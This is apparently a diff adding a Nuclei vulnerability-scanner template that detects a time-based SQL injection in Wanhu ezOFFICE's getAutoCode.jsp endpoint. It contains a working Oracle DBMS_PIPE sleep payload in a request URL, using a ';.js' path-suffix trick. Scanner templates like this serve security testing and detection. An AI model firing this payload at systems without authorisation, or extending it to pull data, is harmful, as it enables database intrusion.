@@ -1,0 +1,42 @@
+id: poc-yaml-wanhu-ezoffice-getautocode-sqli
+info:
+  name: Wanhu ezOFFICE getAutoCode SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects a SQL injection vulnerability in Wanhu ezOFFICE's `getAutoCode` API by leveraging time-based SQL payloads.
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - id: check-login-page
+    method: GET
+    path:
+      - "{{BaseURL}}/defaultroot/login.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "whirRootPath"
+
+  - id: check-sqli-vulnerability
+    method: GET
+    path:
+      - "{{BaseURL}}/defaultroot/platform/custom/customizecenter/js/getAutoCode.jsp;.js?pageId=1&head=2%27+AND+6205%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2898%29%7C%7CCHR%2866%29%7C%7CCHR%2890%29%7C%7CCHR%28108%29%2C{{t1}}%29--+YJdO&field=field_name&tabName=tfield"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - 'trim(body) == ""'
+          - 'duration > to_number(t1)'
+          - 'duration < to_number(t2)'
